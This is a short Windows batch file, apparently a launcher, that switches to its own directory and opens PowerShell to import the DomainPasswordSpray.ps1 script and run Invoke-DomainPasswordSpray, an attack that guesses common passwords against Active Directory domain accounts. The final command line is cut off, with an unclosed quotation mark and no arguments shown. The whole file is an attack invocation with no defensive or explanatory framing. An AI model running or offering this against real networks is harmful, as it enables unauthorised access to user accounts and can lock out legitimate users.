@echo off
cd /d %~dp0
C:\Windows\System32\cmd.exe /K powershell.exe -NoExit -Command "Import-Module .\DomainPasswordSpray.ps1; Invoke-DomainPasswordSpray